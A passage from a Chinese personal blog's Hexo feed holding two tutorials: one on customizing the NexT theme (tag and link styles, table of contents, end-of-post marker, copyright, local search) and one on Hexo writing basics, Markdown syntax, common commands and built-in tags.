<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;post-tags&quot;&gt;</span><br><span class="line">    &#123;%- for tag in post.tags.toArray() %&#125;</span><br><span class="line">        &lt;a href=&quot;&#123;&#123; url_for(tag.path) &#125;&#125;&quot; rel=&quot;tag&quot;&gt; &lt;i class=&quot;fa fa-tag&quot;&gt;&lt;/i&gt; &#123;&#123; tag.name &#125;&#125;&lt;/a&gt; </span><br><span class="line">    &#123;%- endfor %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/images/label.png" alt="标签效果预览"></p>
<h3 id="修改链接样式"><a href="#修改链接样式" class="headerlink" title="修改链接样式"></a>修改链接样式</h3><p>文章中的超链接样式也是可以通过文件来修改的，在 <code>themes/next/source/css/_common/components/post/post.styl</code> 文件末尾添加如下css样式：</p>
<figure class="highlight styl"><figcaption><span>themes/next/source/css/_common/components/post/post.styl</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文章内链接文本样式</span></span><br><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> a&#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="selector-pseudo">&amp;:hover</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/link1.png" alt="链接效果预览"> <img src="/images/link2.png" alt="链接效果预览"></p>
<h3 id="文章目录设置"><a href="#文章目录设置" class="headerlink" title="文章目录设置"></a>文章目录设置</h3><p>可以在 <span class="label success">主题配置文件</span> 中设置文章目录不自动生成并显示数字（可以自己添加）：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">toc:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Automatically add list number to toc.</span></span><br><span class="line">  <span class="attr">number:</span> <span class="literal">false</span>   <span class="comment"># true</span></span><br></pre></td></tr></table></figure>

<div class="note info">
            <p><i class="fa fa-info-circle"></i> 写文章时标题跨级否则取消自动生成数字标号后显示会错乱（一级标题后必须跟二级标题，二级标题后必须跟三级标题，以此类推）</p>
          </div>

<h3 id="文章结束标志"><a href="#文章结束标志" class="headerlink" title="文章结束标志"></a>文章结束标志</h3><p>为了使得文章页面更美观，还可以为其设置一个文章结束标志，以此为分界线。在路径 <code>themes/next/layout/_macro</code> 中新建 <code>passage-end-tag.swig</code> 文件，并添加以下内容：</p>
<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/passage-end-tag.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style=&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;------------- &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; 本文结束感谢您的阅读 &lt;i class=&quot;fa fa-paw&quot;&gt;&lt;/i&gt; -------------&lt;/div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>接着打开 <code>themes/next/layout/_macro/post.swig</code> 文件，在 <code>post-body</code> 之后( <code>END POST BODY</code> )， <code>post-footer</code> 之前添加如下代码：</p>
<figure class="highlight plaintext"><figcaption><span>themes/next/layout/_macro/post.swig</span></figcaption><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &#123;% include &#x27;passage-end-tag.swig&#x27; %&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>最后打开 <span class="label success">主题配置文件</span> 在末尾添加：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/thanksline.png" alt="结束标志效果预览"></p>
<h3 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h3><p>很多人是自己手动写入的文件来添加文章版权信息，为了方便也可以直接在 <span class="label success">主题配置文件</span> 中开启博客的版权功能：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line">  <span class="attr">license:</span> <span class="string">by-nc-sa</span></span><br><span class="line">  <span class="attr">sidebar:</span> <span class="literal">false</span>    <span class="comment"># true，侧边栏显示版权©️</span></span><br><span class="line">  <span class="attr">post:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">language:</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/copyright.png" alt="版权信息效果预览"></p>
<h3 id="图片放大"><a href="#图片放大" class="headerlink" title="图片放大"></a>图片放大</h3><p>针对文章中的图片可能看不清的情况，可以在 <span class="label success">主题配置文件</span> 中找到 <code>fancybox</code> 字段并更改参数：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">fancybox:</span> <span class="literal">true</span>   <span class="comment"># false</span></span><br></pre></td></tr></table></figure>

<h3 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h3><p>该功能由 <code>hexo-generator-searchdb</code> 提供，效果如下图：</p>
<p><img src="/images/search.png" alt="本地搜索效果预览"><br>首先需要在根目录下执行以下命令来安装相关依赖：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>

<p>然后在 <span class="label success">主题配置文件</span> 中修改相关 <code>local_search</code> 字段：</p>
<figure class="highlight yml"><figcaption><span>themes/next/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">local_search:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span>    <span class="comment"># false</span></span><br><span class="line">  <span class="attr">trigger:</span> <span class="string">auto</span>    <span class="comment"># 每次输入改变都执行搜索</span></span><br><span class="line">  <span class="attr">top_n_per_article:</span> <span class="number">3</span>    <span class="comment"># 1， 每篇文章显示的搜索结果数量，如果要显示所有结果可设置为-1</span></span><br><span class="line">  <span class="attr">unescape:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">preload:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<p>在 <span class="label warning">站点配置文件</span> 中添加以下字段：</p>
<figure class="highlight yml"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">search:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">search.xml</span></span><br><span class="line">  <span class="attr">field:</span> <span class="string">post</span> <span class="comment"># 指定搜索范围，可选 post | page | all</span></span><br><span class="line">  <span class="attr">format:</span> <span class="string">html</span> <span class="comment"># 指定页面内容形式，可选 html | raw (Markdown) | excerpt | more</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">10000</span></span><br></pre></td></tr></table></figure>


<hr>
<h4> 参考链接 </h4>

<ol>
<li><a href="http://theme-next.iissnan.com/getting-started.html">NexT 使用文档</a></li>
<li><a href="https://blog.csdn.net/nightmare_dimple/article/details/86661502?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-4.control">Hexo 博客优化之Next 主题美化 - CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_39085060/article/details/103831291">Hexo next 主题博客搭建及美化 - CSDN博客</a></li>
<li><a href="http://yearito.cn/posts/hexo-advanced-settings.html">Hexo 搭建个人博客系列：进阶设置篇 - Yearito’s Blog</a></li>
</ol>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo博客搭建之写作技巧</title>
    <url>/2021/08/04/Hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E4%B9%8B%E5%86%99%E4%BD%9C%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<p>本文介绍 Hexo 博客的写作格式规范。</p>
<p>第一章中介绍了 Hexo 中写作相关的基本概念，包括基本介绍、三种布局、标签与分类、以及如何上传博客。</p>
<p>第二章中介绍了一些基本的 Markdown 写作语法 和 Hexo 常用命令。</p>
<p>第三章中介绍了 Hexo 中常用的内置标签，包括 note 标签、label 标签、button 标签、tab 标签以及代码块的高级用法，通过使用写作标签可以快速编写样式丰富的文档片段。</p>
<p>第四章中介绍了几款优雅实用的 Markdown 写作工具。</p>
<h2 id="开始写作"><a href="#开始写作" class="headerlink" title="开始写作"></a>开始写作</h2><p>本章先做一些基本概念的介绍，这样会利于理解最后的如何发表文章（命令）。</p>
<h3 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h3><p>首先要熟悉我们本地的hexo文件夹包括哪些内容，每个文件夹的存储内容及其作用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">.</span><br><span class="line">└───  本地hexo目录</span><br><span class="line">   ├──  public            // 存放上传部署于GitHub上的文件（即显示为博客内面内容的html文件们）</span><br><span class="line">   ├──  source            // 存放要发表的各个页面原md文件</span><br><span class="line">     ├──  _posts          // 已经发表的md文件原稿</span><br><span class="line">     ├──  _drafts         // 等待发表的md文件草稿</span><br><span class="line">     ├──  about           // about 页面（包含index.md文件）</span><br><span class="line">     ├──  tags            // tags 页面</span><br><span class="line">     ├──  categories      // categories 页面</span><br><span class="line">     └──  404             // 404公益 页面</span><br><span class="line">   ├──  themes            // 存放各主题文件夹</span><br><span class="line">      ├── landscape       // 默认landscape主题</span><br><span class="line">      └──  next           // 当前所使用Next主题，next文件夹下的_config.yml就是next主题的配置文件</span><br><span class="line">   ├──  scaffolds         // 存放各默认模版的设置文件</span><br><span class="line">      ├──  _draft.md</span><br><span class="line">      ├──  _post.md</span><br><span class="line">      └──  _page.md</span><br><span class="line">   └──  _config.yml       // 博客网站配置文件</span><br><span class="line">     ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="三种布局"><a href="#三种布局" class="headerlink" title="三种布局"></a>三种布局</h3><p>Hexo 默认有三种布局：<code>post</code> 、 <code>page</code> 和 <code>draft</code> ，用户可以通过 <code>scaffolds</code> 目录下的md文档来自定义布局格式，还可以通过修改站点配置文件 <code>_config.yml</code> 中的 <code>default_layout</code> 参数（<code>post</code> 、 <code>page</code> 或 <code>draft</code>）来指定生成文档时的默认布局。</p>
<p>由于考虑到一些文章可能需要数天才能完成，这里建议将新建文档时的默认布局设置为 <code>draft</code> ：</p>
<figure class="highlight plaintext"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">default_layout: draft</span><br></pre></td></tr></table></figure>

<blockquote>
<p>文章（post）</p>
</blockquote>
<p>基于 <code>post</code> 布局生成的文档存在于 <code>source/_posts</code> 目录下，该目录下的文档会作为博客正文显示在网站中。</p>
<blockquote>
<p>草稿（draft）</p>
</blockquote>
<p><code>draft</code> 布局用于创建草稿，生成的文档存在于 <code>source/_drafts</code> 目录中，默认配置下将不会把该目录下的文档渲染到网站中。</p>
<p>由于我更改了默认布局设置为 <code>draft</code> ，新建的文档需要通过以下命令将草稿发布为正式文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo publish title</span><br></pre></td></tr></table></figure>
<p>这时 <code>_drafts</code> 里的 <code>title.md</code> 跑到了 <code>_posts</code> 文件夹里，也就说明草稿发布成功了。</p>
<blockquote>
<p>页面（page）</p>
</blockquote>
<p><code>page</code> 布局用于生成类似 <strong>首页</strong> 、 <strong>归档</strong> 、 <strong>标签</strong> 、 <strong>关于</strong> 这样的页面。</p>
<p>想要新建 <code>page</code> 类页面可以使用命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new page aa</span><br></pre></td></tr></table></figure>
<p>与前两种布局不同，这个命令会在 <code>source</code> 文件夹内创建出 <code>aa</code> 文件夹，与 <code>_posts</code> ， <code>_drafts</code> 文件夹并列，文件夹里面有一个index.md文件即为该页面所显示内容。</p>
<p>输入网址 <code>https://xinkjung.github.io/aa/</code> 就能看到该页面了。</p>
<h3 id="标签与分类"><a href="#标签与分类" class="headerlink" title="标签与分类"></a>标签与分类</h3><p>标签和分类都是用于对文章进行归档的一种方式，标签是一种列表结构，而分类是一种树结构。我们以人作为例子，从标签的角度考虑，我可以拥有程序员、甜妹、可爱等标签，这些标签之间没有层级关系；从分类的角度考虑，我是亚洲人、中国人、北京人，这些分类之间是有明确的包含关系的。</p>
<p>可以在 <code>Front-Matter</code> 中添加 <code>catergories</code> 和 <code>tags</code> 字段为文章添加标签和分类，结构如下：</p>
<figure class="highlight plaintext"><figcaption><span>title.md</span></figcaption><table><tr><td class="code"><pre><span class="line">tags: [标签]</span><br><span class="line">categories:</span><br><span class="line">	- 分类</span><br><span class="line">description: 简介</span><br></pre></td></tr></table></figure>

<h3 id="上传博客"><a href="#上传博客" class="headerlink" title="上传博客"></a>上传博客</h3><p>一般完整格式为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: postName               # 文章页面上的显示名称，一般是中文</span><br><span class="line">date: 2013-12-02 15:30:16     # 文章生成时间，一般不改，当然也可以任意修改</span><br><span class="line">categories:                   # 分类</span><br><span class="line">  - 分类         </span><br><span class="line">  - 子分类           </span><br><span class="line">tags: [tag1,tag2,tag3]        # 文章标签，可空，多标签请用格式，注意冒号后面有个空格</span><br><span class="line">description: 附加一段文章摘要，字数最好在140字以内，会出现在meta的description里面</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">以下是正文...</span><br></pre></td></tr></table></figure>

<blockquote>
<p>新建文章</p>
</blockquote>
<p>在hexo所在目录下，打开terminal，在命令行输入：<br>（windows-&gt;文件夹目录下右键-&gt;Git Bash Here，Mac-&gt;选中文件夹右键-&gt;服务-&gt;新建位于文件夹位置的终端窗口）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo new &quot;title&quot;</span><br></pre></td></tr></table></figure>
<p>会生成一个title.md文档存放于 <code>source/_posts</code> 目录下（默认<code>post</code>布局），title即为文章标题，然后就可以使用markdown语法对其进行编辑啦。</p>
<p>由于我设置的默认布局为 <code>draft</code> ，需要先将草稿发布为正式文章：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo publish title</span><br></pre></td></tr></table></figure>

<p>我们可以通过修改 <code>scaffolds</code> 中的几个 md 文件，来修改其对应的模版，比如修改 <code>draft.md</code> 文件如下，此后新生成文章时，会自带 <code>title</code> 及 <code>date</code> 内容， <code>tags</code> 、  <code>categories</code> 、 <code>description</code> 这些属性，就不用再每次手动添加了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123;date&#125;&#125;</span><br><span class="line">tags: </span><br><span class="line">categories: </span><br><span class="line">description: </span><br><span class="line">---</span><br></pre></td></tr></table></figure>

<blockquote>
<p>上传部署</p>
</blockquote>
<p>同理，hexo所在目录下，打开terminal，在命令行输入：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo s -g</span><br></pre></td></tr></table></figure>
<p>出现 <code>&#39;INFO   Hexo is running at https://localhost:4000. Press Ctrl + C to stop.&#39;</code> 即可进入网页进行预览,然后再执行命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure>
<p>无报错后登陆网站查看就可以看到新博文已经发表成功啦！！！</p>
<div class="note info">
            <p><i class="fa fa-info-circle"></i> 如果出现预览成功但最后网页显示不成功的情况可以先用 hexo clean 清楚缓存，再进行部署</p>
          </div>

<h2 id="语法与命令"><a href="#语法与命令" class="headerlink" title="语法与命令"></a>语法与命令</h2><h3 id="Markdown-基本语法"><a href="#Markdown-基本语法" class="headerlink" title="Markdown 基本语法"></a>Markdown 基本语法</h3><table>
<thead>
<tr>
<th>元素</th>
<th>Markdown语法</th>
<th>效果预览</th>
</tr>
</thead>
<tbody><tr>
<td>标题</td>
<td><code># 标题1</code> <br><code>## 标题2</code> <br><code>### 标题3</code></td>
<td># 标题1 <br>## 标题2  <br>### 标题3</td>
</tr>
<tr>
<td>文字加粗</td>
<td><code>**文字加粗**</code></td>
<td><strong>文字加粗</strong></td>
</tr>
<tr>
<td>字体倾斜</td>
<td><code>*斜体*</code> 或 <code>_斜体_</code></td>
<td><em>斜体</em> 或 <em>斜体</em></td>
</tr>
<tr>
<td>加粗斜体</td>
<td><code>***加粗斜体***</code></td>
<td><em><strong>加粗斜体</strong></em></td>
</tr>
<tr>
<td>删除线</td>
<td><code>~~删除线~~</code></td>
<td><del>删除线</del></td>
</tr>
<tr>
<td>引用/区块</td>
<td><code>&gt; 引用</code></td>
<td>&gt; 引用</td>
</tr>
<tr>
<td>有序列表</td>
<td><code>1. 第一项</code> <br><code>2. 第二项</code> <br><code>3. 第三项\</code></td>
<td>1. 第一项 <br>2. 第二项 <br>3. 第三项</td>
</tr>
<tr>
<td>无序列表</td>
<td><code>- 第一项</code> <br><code>+ 第二项</code> <br><code>* 第三项</code></td>
<td>- 第一项 <br>+ 第二项 <br>* 第三项</td>
</tr>
<tr>
<td>超链接</td>
<td><code>[关于我](URL)</code></td>
<td><a href="https://xinkjung.github.io/about">关于我</a></td>
</tr>
<tr>
<td>插入图片</td>
<td><code>![图片](url)</code></td>
<td><img src="/images/icon_photo.png" alt="图片"></td>
</tr>
<tr>
<td>水平线</td>
<td><code>---</code></td>
<td>—</td>
</tr>
<tr>
<td>换行</td>
<td><code>&lt;br&gt;</code></td>
<td><br></td>
</tr>
<tr>
<td>代码</td>
<td><code>`code`</code></td>
<td><code>code</code></td>
</tr>
<tr>
<td>代码块</td>
<td><code>```code snippet```</code></td>
<td><code>code snippet</code></td>
</tr>
<tr>
<td>插入图标</td>
<td><code>&lt;i class=&quot;fa fa-bolt&quot;&gt;&lt;/i&gt;</code></td>
<td><i class="fa fa-bolt"></i></td>
</tr>
</tbody></table>
<p>关于插入图片的 url 地址，有三种不同路径链接：</p>
<ul>
<li>src 链接：直接复制图片的 <code>src 链接</code> 为 <code>url</code> 即可</li>
<li>本地绝对路径：图片统一放在 <code>source/images</code> 文件夹中，<code>url</code> 为 <code>/images/name.jpg</code></li>
<li>本地相对路径：将 <code>_config.yml</code> 文件中的配置项 <code>post_asset_folder</code> 设为 <code>true</code> 后，新建文章时会自动在 <code>source/_posts</code> 中会生成文章 <code>post_name.md</code> 和同名文件夹 <code>post_name</code> ，将图片资源放在文章自己的目录 <code>post_name</code> 中，文章就可以使用相对路径引用图片资源了，这时 <code>url</code> 为 <code>name.jpg</code></li>
</ul>
<p>插入的图标皆为 <a href="http://www.fontawesome.com.cn/">FontAwesome图标</a> 库中的，将代码 <code>fa fa-bolt</code> 替换为对应图标名称即可。</p>
<h3 id="Hexo-常用命令"><a href="#Hexo-常用命令" class="headerlink" title="Hexo 常用命令"></a>Hexo 常用命令</h3><blockquote>
<p>基本命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo new &quot;postName&quot;          # 新建文章 </span><br><span class="line">$ hexo new page &quot;pageName&quot;     # 新建页面 </span><br><span class="line">$ hexo generate                # 生成静态页面至public目录 </span><br><span class="line">$ hexo server                  # 开启预览访问端口（默认4000，&#x27;ctrl+c&#x27;关闭server） </span><br><span class="line">$ hexo deploy                  # 部署到Github，上传 </span><br><span class="line">$ hexo help                    # 查看帮助 </span><br><span class="line">$ hexo version                 # 查看hexo版本</span><br><span class="line">$ hexo clean                   # 清楚缓存</span><br></pre></td></tr></table></figure>

<blockquote>
<p>命令缩写 </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo n == hexo new </span><br><span class="line">$ hexo g == hexo generate </span><br><span class="line">$ hexo s == hexo server </span><br><span class="line">$ hexo d == hexo deploy</span><br></pre></td></tr></table></figure>

<blockquote>
<p>组合命令</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ hexo s -g         # 生成并本地预览 </span><br><span class="line">$ hexo d -g         # 生成并上传 </span><br><span class="line">$ hexo s --debug    # 进入调试模式</span><br></pre></td></tr></table></figure>

<h2 id="Hexo-内置标签"><a href="#Hexo-内置标签" class="headerlink" title="Hexo 内置标签"></a>Hexo 内置标签</h2><div class="note info">
            <p><i class="fa fa-info-circle"></i>  标签内的可变参数均用 [] 括起来了，实际使用时去掉括号填写对应参数即可</p>
          </div>

<h3 id="文本居中"><a href="#文本居中" class="headerlink" title="文本居中"></a>文本居中</h3><p>一般在引用单行文本时使用，如作为文章开篇题词。居中标签效果如下：</p>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>面朝大海 春暖花开 </p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<p>可以通过以下几种方式使用该标签：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. HTML方式: 直接在 Markdown 文件中编写 HTML 来调用, 其中  class=&quot;blockquote-center&quot; 是必须的 :</span><br><span class="line"> &lt;blockquote class=&quot;blockquote-center&quot;&gt;blah blah blah&lt;/blockquote&gt;</span><br><span class="line"></span><br><span class="line">2. 标签方式 :</span><br><span class="line">&#123;% centerquote %&#125;blah blah blah&#123;% endcenterquote %&#125;</span><br><span class="line"></span><br><span class="line">1. 标签别名 :</span><br><span class="line">&#123;% cq %&#125; blah blah blah &#123;% endcq %&#125;</span><br></pre></td></tr></table></figure>

<p>发现软件预览效果与网页预览效果实际不同，最后以实际网页预览测试为准。</p>
<h3 id="代码块进阶"><a href="#代码块进阶" class="headerlink" title="代码块进阶"></a>代码块进阶</h3><p>可以通过为代码块附加参数的形式为其添加更丰富的信息提示，效果如下：</p>
<figure class="highlight python"><figcaption><span>Hello World.py</span></figcaption><table><tr><td class="code"><pre><span class="line">printf(<span class="string">&quot;Hello World!&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>代码块进阶语法规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 三个反引号：</span><br><span class="line">``` [language] [title] [url] [link text]</span><br><span class="line">code snippet </span><br><span class="line">``` `</span><br><span class="line">2. 标签方式（或简写为code）：</span><br><span class="line">&#123;% codeblock [title] [lang:language] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure>

<p>其中，各参数意义如下：</p>
<ul>
<li>langugae：语言名称，引导渲染引擎正确解析并高亮显示关键字</li>
<li>title：代码块标题，将会显示在左上角</li>
<li>url：链接地址，如果没有指定 link text 则会在右上角显示 link</li>
<li>link text：链接名称，指定 url 后有效，将会显示在右上角</li>
</ul>
<p>url 必须为有效链接地址才会以链接的形式显示在右上角，否则将作为标题显示在左上角。以 url 为分界，左侧除了第一个单词会被解析为 language，其他所有单词都会被解析为 title，而右侧的所有单词都会被解析为 link text。</p>
<p>ps: 如果不想填写 title，可以在 language 和 url 之间添加至少三个空格。</p>
<p>可以在站点配置文件中设置 <code>highlight.auto_detect</code> 参数来开启自动语言检测高亮:</p>
<figure class="highlight diff"><figcaption><span>_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line">highlight:</span><br><span class="line">   enable: true</span><br><span class="line">   line_number: false</span><br><span class="line"><span class="deletion">-  auto_detect: false</span></span><br><span class="line"><span class="addition">+  auto_detect: true</span></span><br><span class="line">   tab_replace:</span><br></pre></td></tr></table></figure>

<p>如果设置语言为 diff，可以在代码前添加 <code>+</code> 和 <code>-</code> 来使用如上所示的高亮增删行提示效果，在展示代码改动痕迹时比较实用。</p>
<h3 id="note-标签"><a href="#note-标签" class="headerlink" title="note 标签"></a>note 标签</h3><p>通过 note 标签可以为段落添加背景色，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note [class] %&#125;</span><br><span class="line">文本内容 (支持行内标签)</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>

<p>支持的 <code>class</code> 种类包括 <code>default</code> 、 <code>primary</code> 、 <code>success</code> 、 <code>info</code> 、 <code>warning</code> 、 <code>danger</code>，也可以不指定 class ，各种效果及使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% note primary %&#125; **primary** note tag &#123;% endnote %&#125; </span><br></pre></td></tr></table></figure>

<div class="note primary">
            <p><strong>primary</strong> note tag </p>
          </div> 

<div class="note success">
            <p><strong>success</strong> note tag </p>
          </div> 

<div class="note info">
            <p><strong>info</strong> note tag </p>
          </div> 

<div class="note warning">
            <p><strong>warning</strong> note tag </p>
          </div> 

<div class="note danger">
            <p><strong>danger</strong> note tag </p>
          </div> 

<div class="note default">
            <p>undefined class note tag （default）</p>
          </div>

<p>更多配置可在主题配置文件中设置:</p>
<figure class="highlight yml"><figcaption><span>themes\next\_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">note:</span></span><br><span class="line">  <span class="comment"># Note 标签样式预设</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">modern</span>  <span class="comment"># simple | modern | flat | disabled</span></span><br><span class="line">  <span class="attr">icons:</span> <span class="literal">false</span>  <span class="comment"># 是否显示图标</span></span><br><span class="line">  <span class="attr">border_radius:</span> <span class="number">3</span>  <span class="comment"># 圆角半径</span></span><br><span class="line">  <span class="attr">light_bg_offset:</span> <span class="number">0</span>  <span class="comment"># 默认背景减淡效果，以百分比计算</span></span><br></pre></td></tr></table></figure>

<h3 id="label-标签"><a href="#label-标签" class="headerlink" title="label 标签"></a>label 标签</h3><p>通过 label 标签可以为文字添加背景色，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% label [class]@text  %&#125;</span><br></pre></td></tr></table></figure>
<p>支持的 <code>class</code> 种类包括 <code>default</code> 、 <code>primary</code> 、 <code>success</code> 、 <code>info</code> 、  <code>warning</code> 、 <code>danger</code>，默认使用 <code>default</code> 作为缺省。</p>
<p>使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">I heard the echo, &#123;% label default@from the valleys and the heart %&#125;</span><br><span class="line">Open to the lonely soul of &#123;% label info@sickle harvesting %&#125;</span><br><span class="line">Repeat outrightly, but also repeat the well-being of</span><br><span class="line">Eventually &#123;% label warning@swaying in the desert oasis %&#125;</span><br><span class="line">&#123;% label success@I believe %&#125; I am</span><br><span class="line">&#123;% label primary@Born as the bright summer flowers %&#125;</span><br><span class="line">Do not withered undefeated fiery demon rule</span><br><span class="line">Heart rate and breathing to bear &#123;% label danger@the load of the cumbersome %&#125;</span><br><span class="line">Bored</span><br></pre></td></tr></table></figure>
<blockquote class="blockquote-center">
            <i class="fa fa-quote-left"></i>
            <p>I heard the echo, <span class="label default">from the valleys and the heart</span> <br><br>Open to the lonely soul of <span class="label info">sickle harvesting</span><br><br>Repeat outrightly, but also repeat the well-being of <br><br>Eventually <span class="label warning">swaying in the desert oasis</span> <br><br><span class="label success">I believe</span> I am <br><br><span class="label primary">Born as the bright summer flowers</span> <br><br>Do not withered undefeated fiery demon rule <br><br>Heart rate and breathing to bear <span class="label danger">the load of the cumbersome</span> <br><br>Bored</p>

            <i class="fa fa-quote-right"></i>
          </blockquote>

<p>可在主题配置文件中设置 <code>label: false</code> 来取消 label 标签默认 CSS 样式。</p>
<h3 id="button-按钮"><a href="#button-按钮" class="headerlink" title="button 按钮"></a>button 按钮</h3><p>通过 button 标签可以快速添加带有主题样式的按钮，语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% button [url], [text], [icon class], [title] %&#125;</span><br><span class="line"></span><br><span class="line"># 也可简写为：</span><br><span class="line">&#123;% btn [url], [text], [icon class], [title] %&#125;</span><br></pre></td></tr></table></figure>

<p>其中各参数含义如下：</p>
<ul>
<li>url：绝对或相对路径</li>
<li>text：按钮文字</li>
<li>icon class：FontAwesome 图标包括 fa-fw | fa-lg | fa-2x | fa-3x | fa-4x | fa-5x 等</li>
<li>title：鼠标悬停时的工具提示</li>
</ul>
<p>使用示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% btn #, Home, %&#125;</span><br></pre></td></tr></table></figure>

<a class="btn" href="#">
            <i class="fa fa-"></i>Home
          </a>

<h3 id="tabs-选项标签"><a href="#tabs-选项标签" class="headerlink" title="tabs 选项标签"></a>tabs 选项标签</h3><p>tabs 标签用于快速创建 tabs 选项卡，语法如下：</p>
